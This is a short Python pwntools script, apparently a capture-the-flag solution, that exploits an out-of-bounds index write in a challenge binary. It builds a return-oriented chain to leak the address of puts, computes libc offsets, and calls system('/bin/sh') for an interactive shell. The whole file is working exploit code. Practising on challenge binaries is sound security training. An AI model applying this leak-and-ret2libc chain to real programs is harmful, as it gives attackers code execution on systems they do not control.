#!/usr/bin/env python3

# Title:        solve.py
# Description:  01 solution
# Author:       bluecosmo

from pwn import *

# 22 - RBP
# 23 - RET ADDR

context.terminal = ["tmux", "splitw", "-h"]
gdbcmds = """
b main
b * main + 144
b * main + 265
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
"""

elf = context.binary = ELF("./chall")
p = process(elf.path)
p = gdb.debug(elf.path, gdbscript=gdbcmds)

POP_RBP = str(0x000000000040119d) # pop rbp ; ret
POP_RDI = str(0x0000000000401206) # pop rdi ; ret
RET = str(0x000000000040101a) # ret

puts_plt = str(elf.plt["puts"])
puts_got = str(elf.got["puts"])
a_main = str(elf.symbols["main"])

# Step 1: Move index to return address
p.recvuntil(b": ")
p.sendline(b"23")
p.recvuntil(b"num: ")
p.sendline(POP_RDI)

p.recvuntil(b": ")
p.sendline(b"24")
p.recvuntil(b"num: ")
p.sendline(puts_got)

p.recvuntil(b": ")
p.sendline(b"25")
p.recvuntil(b"num: ")
p.sendline(puts_plt)

p.recvuntil(b": ")
p.sendline(b"26")
p.recvuntil(b"num: ")
p.sendline(a_main)

p.recvuntil(b": ")
p.sendline(b"-1")

p.recvuntil(b"sum: 0\n")
a_puts = p.recv(21).strip().split(b"G")[0]
print(a_puts)
a_puts = u64(a_puts.ljust(8, b'\x00'))
print(f"PUTS: {hex(a_puts)}")

# Step 3: Calculate libc address
a_libc = a_puts - 0x5e380
a_binsh = a_libc + 0x1b1064
a_system = a_libc + 0x2f1e0

print(f"LIBC: {hex(a_libc)}")
print(f"BINSH: {hex(a_binsh)}")
print(f"SYS: {hex(a_system)}")

p.recvuntil(b": ")
p.sendline(b"23")
p.recvuntil(b"num: ")
p.sendline(POP_RDI)

p.recvuntil(b": ")
p.sendline(b"24")
p.recvuntil(b"num: ")
p.sendline(str(a_binsh))

p.recvuntil(b": ")
p.sendline(b"25")
p.recvuntil(b"num: ")
p.sendline(RET)

p.recvuntil(b": ")
p.sendline(b"26")
p.recvuntil(b"num: ")
p.sendline(str(a_system))

# p.recvuntil(b": ")
# p.sendline(b"27")
# p.recvuntil(b"num: ")
# p.sendline(str(a_main))

p.recvuntil(b": ")
p.sendline(b"-1")

p.interactive()
